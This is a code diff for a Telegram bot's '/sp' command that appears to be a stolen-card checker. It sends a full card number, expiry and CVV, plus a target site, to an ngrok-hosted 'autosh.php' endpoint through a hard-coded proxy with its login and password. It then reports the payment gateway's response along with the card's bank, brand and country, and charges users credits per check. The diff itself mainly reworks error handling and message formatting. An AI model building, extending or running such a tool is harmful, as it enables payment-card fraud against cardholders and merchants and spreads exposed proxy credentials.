@@ -2738,29 +2738,37 @@ async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+import asyncio
+import aiohttp
+import json
+from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
-import aiohttp
 from db import get_user
-from html import escape
 
-API_CHECK_TEMPLATE = "https://7feeef80303d.ngrok-free.app/autosh.php?cc={card}&site={site}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-BULLET_GROUP_LINK = "https://t.me/your_group_here"  # Make bullet clickable
+API_CHECK_TEMPLATE = (
+    "https://7feeef80303d.ngrok-free.app/autosh.php"
+    "?cc={card}"
+    "&site={site}"
+    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+)
 
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handler for /sp card|mm|yy|cvv"""
     user = update.effective_user
     user_id = user.id
-    args = context.args
 
-    if not args:
+    if not context.args:
         await update.message.reply_text(
-            "❌ Please provide card details.\nExample: /sp 5444228607773355|04|28|974",
+            "❌ Please provide card details. Example: /sp 5444228607773355|04|28|974",
             parse_mode=ParseMode.HTML
         )
         return
 
+    card_input = context.args[0].strip()
+
+    # Fetch user data
     user_data = await get_user(user_id)
     custom_url = user_data.get("custom_url")
     if not custom_url:
@@ -2770,7 +2778,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    card_input = args[0].strip()
+    # Send initial "Checking..." message
     msg = await update.message.reply_text(
         f"⏳ Checking card: <code>{escape(card_input)}</code>...",
         parse_mode=ParseMode.HTML
@@ -2780,52 +2788,69 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=30) as resp:
-                if resp.status != 200:
-                    await msg.edit_text(f"❌ API returned HTTP {resp.status}")
-                    return
+            async with session.get(api_url, timeout=50) as resp:
+                api_text = await resp.text()
                 try:
-                    data = await resp.json()
-                except Exception:
-                    text = await resp.text()
-                    await msg.edit_text(f"❌ Invalid API response:\n<pre>{escape(text)}</pre>", parse_mode=ParseMode.HTML)
+                    data = json.loads(api_text)
+                except json.JSONDecodeError:
+                    await msg.edit_text(
+                        f"❌ Invalid API response:\n<pre>{escape(api_text)}</pre>",
+                        parse_mode=ParseMode.HTML
+                    )
                     return
+
+        # Extract API fields safely
+        response_text = data.get("Response", "Unknown")
+        price = data.get("Price", "-")
+        gateway = data.get("Gateway", "-")
+        brand = data.get("Brand", "-")
+        bank = data.get("Bank", "-")
+        country = data.get("Country", "-")
+        credits_left = user_data.get("credits", 0)
+
+        requester = f"@{user.username}" if user.username else str(user.id)
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/K4linuxxxx"
+        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
+
+        # Clickable bullet linking to your group/channel
+        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # <-- replace with your link
+        bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
+
+        formatted_msg = (
+            f"═══[ <b>{gateway.upper()}</b> ]═══\n"
+            f"{bullet_link} <b>Card</b> ➜ <code>{escape(card_input)}</code>\n"
+            f"{bullet_link} <b>Gateway</b> ➜ {gateway}\n"
+            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response_text)}</i>\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} <b>Brand</b> ➜ {brand}\n"
+            f"{bullet_link} <b>Bank</b> ➜ {bank}\n"
+            f"{bullet_link} <b>Country</b> ➜ {country}\n"
+            f"――――――――――――――――\n"
+            f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
+            f"{bullet_link} <b>Credits Left</b> ➜ {credits_left}\n"
+            f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
+            f"――――――――――――――――"
+        )
+
+        await msg.edit_text(
+            formatted_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+    except asyncio.TimeoutError:
+        await msg.edit_text(
+            "❌ Error: API request timed out. Try again later.",
+            parse_mode=ParseMode.HTML
+        )
     except Exception as e:
-        await msg.edit_text(f"❌ Failed to check card: <code>{escape(str(e))}</code>", parse_mode=ParseMode.HTML)
-        return
-
-    # Extract API fields safely
-    response_text = data.get("Response", "Unknown")
-    price = data.get("Price", "-")
-    gateway = data.get("Gateway", "-")
-    brand = data.get("Brand", "-")
-    bank = data.get("Bank", "-")
-    country = data.get("Country", "-")
-    credits_left = user_data.get("credits", 0)
-
-    # Clickable bullet
-    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>✗</a>"
-
-    # Format final message
-    final_message = (
-        f"═══[ <b>{escape(gateway.upper())}</b> ]═══\n"
-        f"{bullet_link} <b>Card</b> ➜ <code>{escape(card_input)}</code>\n"
-        f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway)}\n"
-        f"{bullet_link} <b>Response</b> ➜ <i>{escape(response_text)}</i>\n"
-        f"――――――――――――――――\n"
-        f"{bullet_link} <b>Brand</b> ➜ {escape(brand)}\n"
-        f"{bullet_link} <b>Bank</b> ➜ {escape(bank)}\n"
-        f"{bullet_link} <b>Country</b> ➜ {escape(country)}\n"
-        f"――――――――――――――――\n"
-        f"{bullet_link} <b>Request By</b> ➜ @{user.username or user.first_name}\n"
-        f"{bullet_link} <b>Credits Left</b> ➜ {credits_left}\n"
-        f"{bullet_link} <b>Developer</b> ➜ kคli liຖนxx\n"
-        f"――――――――――――――――"
-    )
-
-    await msg.edit_text(final_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-
-
+        import logging
+        logging.exception("Error in /sp command")
+        await msg.edit_text(
+            f"❌ Error: <code>{escape(str(e))}</code>",
+            parse_mode=ParseMode.HTML
+        )
 
 
 
